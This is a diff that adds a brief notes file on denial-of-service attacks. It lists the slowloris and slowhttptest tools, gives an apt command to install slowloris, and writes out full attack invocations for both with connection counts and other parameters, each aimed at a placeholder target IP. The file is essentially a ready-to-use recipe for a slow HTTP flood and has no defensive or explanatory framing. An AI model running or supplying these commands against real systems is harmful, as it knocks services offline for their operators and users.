@@ -1,0 +1,10 @@
+dos
+---
+1)slowloris and slowhttptest 
+2)installation for slowloris : sudo apt install slowloris -y
+to start attack
+slowloris -p 443 -s 1000 -v target_ip
+ 
+attack with slowhttptest
+
+slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u target_ip -x 24 -p 3
